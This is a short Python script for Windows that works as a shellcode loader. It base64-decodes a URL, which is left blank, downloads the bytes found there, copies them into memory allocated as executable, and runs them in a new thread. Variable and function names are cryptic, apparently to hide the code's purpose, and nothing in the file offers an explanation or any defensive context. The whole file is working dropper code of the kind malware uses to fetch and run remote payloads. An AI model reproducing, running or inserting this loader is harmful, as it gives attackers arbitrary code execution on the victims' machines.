import ctypes as kk
import requests as rr
import base64 as bb

def O(data):   
    b_x = data
    kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
    kk.windll.kernel32.CreateThread.argtypes = (
        kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
    )

   
    s = kk.windll.kernel32.VirtualAlloc
    t = kk.windll.kernel32.CreateThread
    u = kk.windll.kernel32.RtlMoveMemory
    v = kk.windll.kernel32.WaitForSingleObject
    spc = s(kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40))
    bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
    u(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
    hndl = t(kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
             kk.pointer(kk.c_int(0)))
    v(hndl, kk.c_uint32(0xffffffff))

def dd(ee):
   
    decoded_url = bb.b64decode(ee).decode()
    return decoded_url

if __name__ == "__main__":
    # Define the static URL here
    static_url = ""
    dd_url = dd(static_url)

    rs = rr.get(dd_url)
    if rs.status_code == 200:
        data = rs.content
        print("Received shellcode data:", len(data), "bytes")
        O(data)
    else:
        print("Failed to fetch the shellcode from the URL:", rs.status_code)
